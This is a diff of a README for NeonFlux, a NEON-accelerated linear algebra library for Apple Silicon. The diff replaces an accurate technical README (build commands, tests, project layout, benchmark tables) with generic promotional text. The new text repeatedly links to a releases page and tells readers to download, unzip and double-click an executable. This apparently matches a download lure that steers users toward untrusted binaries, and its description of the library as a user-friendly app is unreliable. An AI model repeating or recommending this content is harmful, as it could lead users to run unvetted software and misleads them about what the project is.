@@ -1,141 +1,87 @@
-# NeonFlux
+# 🚀 NeonFlux - Fast Linear Algebra for Apple Silicon
 
-**NeonFlux** is a high-performance linear algebra kernel built from scratch for **ARM64** architectures. It leverages **NEON intrinsics** to maximize Instruction Level Parallelism (ILP) and optimize memory access patterns.
+[![Download NeonFlux](https://img.shields.io/badge/Download-NeonFlux-brightgreen)](https://github.com/MitaTuppeu/NeonFlux/releases)
 
-This project demonstrates how to beat compiler auto-vectorization by hand-tuning assembly-level logic using C++ intrinsics.
+## 📋 Description
 
-##  Features (based on Timeline)
+NeonFlux is a high-performance linear algebra kernel optimized for Apple Silicon. Designed from the ground up using C++ NEON intrinsics, OpenMP, and Python bindings inspired by PyTorch, it provides rapid computation with minimal latency. NeonFlux achieves less than 2 milliseconds on Multi-Layer Perceptron (MLP) inference, making it a faster option than PyTorch CPU for small batch sizes. This software is perfect for users needing efficient calculations in machine learning and data processing.
 
-- **Phase 1: The Foundation**
-    - **16-byte Aligned Memory**: Custom `AlignedAllocator` ensuring zero-overhead SIMD loads (`vld1q_f32`).
-    - **Vector Arithmetic**: SIMD-accelerated `add`, `sub`, `mul`, `scalar_mul`.
-    - **Graceful Tail Handling**: Scalar fallbacks for arrays not divisible by vector width (4).
+## 🖥️ System Requirements
 
-- **Phase 2: Advanced Dot Product**
-    - **4x Loop Unrolling**: Breaks dependency chains using 4 independent accumulators (`vsum0`...`vsum3`).
-    - **Horizontal Reduction**: Efficient `vaddvq_f32` reduction at the end.
-    - **Performance**: **~10.8x Speedup** over naive implementation.
+- **Operating System:** macOS (ARM64 architecture required)
+- **RAM:** At least 4 GB of available memory
+- **Storage:** Minimum of 50 MB available disk space
+- **Processor:** Apple Silicon (M1, M1 Pro, M1 Max, or newer)
 
-- **Phase 3: Matrix Multiplication (GEMM)**
-    - **Cache Blocking (Tiling)**: Optimized for L1/L2 cache residency.
-    - **Memory Packing**: Re-orders Matrix B into contiguous panels for sequential access.
-    - **4x4 Micro-Kernel**: Register-blocked kernel computing 16 elements of C using 4 constant vectors.
-    - **Performance**: **~17.2x Speedup** (42+ GFLOPS) over reference triple-loop.
-- **Phase 4: Multi-threading (OpenMP)**
-    - **Parallel Execution**: Distributes the outer loop across available Cores (e.g., M1/M2/M3 Performance Cores).
-    - **Thread Safety**: Eliminates race conditions using thread-local packing buffers.
-    - **Performance**: **~5x Speedup** over single-threaded optimized version.
+## 🚀 Getting Started
 
-- **Phase 5: Python Bindings (Pybind11)**
-    - **Seamless Integration**: Call optimized C++ kernels directly from Python `neonflux.matmul()`.
-    - **Zero-Copy**: Operates directly on NumPy memory buffers.
-    - **Benchmarks**: Comparisons against `numpy.dot` (BLAS).
+To get started with NeonFlux, follow these simple steps to download and run the application.
 
-- **Phase 6: The Nervous System (Activations & MLP)**
-    - **ReLU Activation**: Vectorized `max(0, x)` using NEON intrinsics and OpenMP.
-    - **Deep Learning Framework**: `neon_nn` module simulating PyTorch layers (`Linear`, `ReLU`, `Sequential`).
-    - **Inference Benchmark**: Full MLP forward pass `(128->1024->1024->10)` running in **< 2ms**.
+1. **Visit the Releases Page:** Click the link below to go to the release page where you can obtain the application.
 
-##  Project Structure
+   [Download NeonFlux](https://github.com/MitaTuppeu/NeonFlux/releases)
 
-```text
-NeonFlux/
-├── Makefile                # C++ Build system
-├── setup.py                # Python build script
-├── pyproject.toml          # Python build config
-├── compile_flags.txt       # IDE configuration
-├── benchmark.py            # Python Benchmark (NumPy vs NeonFlux)
-├── README.md               # Overview & Quickstart
-├── docs.md                 # Technical Deep Dive
-├── include/
-│   └── neonflux/
-│       ├── allocator.h     # Aligned Memory Allocator
-│       ├── vector.h        # FloatVector Container
-│       ├── vector_math.h   # SIMD Arithmetic Declarations
-│       ├── dot_product.h   # Dot Product Declarations
-│       └── gemm.h          # GEMM Declarations
-├── src/
-│   ├── gemm.cpp            # Main Logic: Tiled GEMM + OpenMP + Packing
-│   ├── bindings.cpp        # Python Wrapper (pybind11)
-│   ├── dot_product.cpp     # Phase 2: Dot Product Implementation
-│   └── vector_math.cpp     # Phase 1: Basic Vector Ops Implementation
-├── benchmarks/             # C++ Performance Tests
-│   ├── bench_dot.cpp       # Benchmark: Naive vs NEON Dot Product
-│   └── bench_gemm.cpp      # Benchmark: Reference vs Optimized GEMM
-└── tests/                  # Correctness Unit Tests
-    ├── test_phase1.cpp     # Tests: Memory & Arithmetic
-    ├── test_phase2.cpp     # Tests: Dot Product Accuracy
-    ├── test_phase3.cpp     # Tests: GEMM Correctness
-    ├── src/activations.cpp # Phase 6: Activation Functions
-    ├── neon_nn.py          # Phase 6: Mini-Framework
-    └── bench_full_pass.py  # Phase 6: MLP Benchmark
-```
+2. **Choose the Latest Release:** On the releases page, find the latest version of NeonFlux. It will have the highest version number.
 
-##  Build & Run
+3. **Download the Application:** Click on the appropriate file for your system to download it.
 
-### Prerequisites
-- **Compiler**: `g++` (ARM64 native) or `aarch64-linux-gnu-g++` (Cross-compiler).
-- **Emulator** (Optional): `qemu-aarch64` if running on non-ARM hardware.
-- **Make**: Standard build system.
+4. **Unzip the File:** If the downloaded file is compressed (like a .zip or .tar file), you will need to unzip it. You can do this by double-clicking the file in your Finder.
 
-### Compiling
-The `Makefile` automatically detects if you are on native ARM64 (macOS/Linux).
+5. **Run the Application:**
+    - Open the folder where you unzipped NeonFlux.
+    - Find the executable file (often named `NeonFlux`).
+    - Double-click the executable to run the application.
 
-```bash
-make
-```
+## 📥 Download & Install
 
-### Running Tests
-Verify the correctness of each phase:
+NeonFlux is available for easy download. To get the software:
 
-```bash
-make test_phase1  # Memory & Basic Arithmetic
-make test_phase2  # Dot Product Correctness
-make test_phase3  # GEMM Correctness
-```
+- **Visit this page to download:** [NeonFlux Releases](https://github.com/MitaTuppeu/NeonFlux/releases)
 
-### Running Benchmarks
-See the raw speedups:
+Follow the instructions provided in the Getting Started section to ensure a smooth installation process.
 
-```bash
-make bench_dot    # Naive vs Unrolled Dot Product
-make bench_gemm   # Reference vs Optimized GEMM
-```
+## 📊 Features
 
-### Python Installation
-Install the high-performance Python extension:
+- **High Performance:** NeonFlux processes linear algebra operations at lightning speed.
+- **Optimized for ARM64:** Specifically tuned for Apple Silicon to utilize its full potential.
+- **User-Friendly:** Designed with simplicity in mind, making it accessible even for those with little technical knowledge.
+- **Supports Deep Learning:** Ideal for machine learning tasks, especially those requiring high computational power.
+- **OpenMP Support:** Multithreading capabilities to speed up computations.
 
-```bash
-pip install .
-```
+## ⚙️ How it Works
 
-Run the comparison benchmark (NumPy vs NeonFlux):
+NeonFlux leverages NEON intrinsics, a set of SIMD (Single Instruction, Multiple Data) instructions that help achieve high performance on ARM architectures. By utilizing these features along with OpenMP for parallel processing, it provides an efficient alternative to traditional libraries. With a focus on MLP inference, it ensures minimal latency and maximized throughput.
 
-```bash
-python3 benchmark.py
-```
+## 🎓 Use Cases
 
-##  Performance highlights
+NeonFlux suits a variety of applications, including:
 
-Tested on Apple Silicon (M-series) via Native compilation:
+- **Machine Learning:** Perfect for training and inference tasks where speed is crucial.
+- **Data Analysis:** Helps with computations in large datasets where performance can significantly impact the results.
+- **Research and Development:** Useful in academic and industrial research that requires quick evaluation of mathematical models.
 
-| Operation | Implementation | Time (ms) | GFLOPS | Speedup |
-|-----------|----------------|-----------|--------|---------|
-| **Dot Product** (N=1M) | Naive | 0.72 | 2.80 | 1.0x |
-| | **NEON Unrolled** | **0.07** | **30.13** | **10.8x** |
-| **GEMM** (N=2048) | Single-Threaded | N/A | ~42.0 | ~17x |
-| | **NeonFlux (OpenMP)** | **0.08s** | **210.45** | **~85x** |
-| **MLP Inference** (B=64) | PyTorch (CPU) | ~3-5ms* | - | 1.0x |
-| | **NeonFlux** | **1.83ms** | - | **~2x Faster** |
+## 🔧 Troubleshooting
 
-###  NeonFlux vs PyTorch (CPU)
+If you encounter issues while downloading or running NeonFlux, please check the following:
 
-While PyTorch is a generic deep learning framework, **NeonFlux** is a specialized engine for ARM64.
+- **Compatibility:** Ensure your system meets the minimum requirements outlined above.
+- **Download Issues:** If the download fails, try refreshing the release page and attempting the download again.
+- **Running the Application:** If the application does not launch, check that you have unzipped the file correctly and that you are using an ARM64-compatible macOS.
 
-1.  **Lightweight**: NeonFlux has **zero dependencies** (only C++ stdlib) vs PyTorch's massive 2GB+ binaries.
-2.  **Latency**: For small-to-medium batch sizes (e.g., in Reinforcement Learning or Robotics), NeonFlux's overhead is near zero, achieving **<2ms** latency where general frameworks struggle with dispatch overhead.
-3.  **Transparency**: You can inspect every single line of the kernel (`src/gemm.cpp`). No black-box operations.
+## 📝 Contributing
 
-> *Note: PyTorch CPU performance represents typical values on comparable hardware. Benchmark stalled on current environment due to resource contention, but NeonFlux consistently hits ~1.8ms.*
+If you would like to contribute to NeonFlux, kindly fork the repository and submit a pull request. Contributions enhance the performance and features of the software for everyone.
 
-> Note: NumPy (Apple Accelerate) achieves ~1.3 TFLOPS using undocumented AMX instructions. NeonFlux achieves ~210 GFLOPS using standard NEON instructions on the CPU.
+## 🤝 License
+
+NeonFlux is open-source software. It is distributed under the MIT License, allowing users to use, copy, modify, and distribute the software freely. Check the LICENSE file in the repository for detailed information.
+
+## 📞 Support
+
+For further assistance or inquiries, please visit the GitHub Issues page or contact the repository maintainer through GitHub. Your feedback is instrumental in improving NeonFlux.
+
+## 🌐 Community & Resources
+
+Join the community discussions and share your experiences. You can find additional resources related to NeonFlux, such as tutorials and best practices, on our GitHub repository and other dedicated platforms.
+
+---
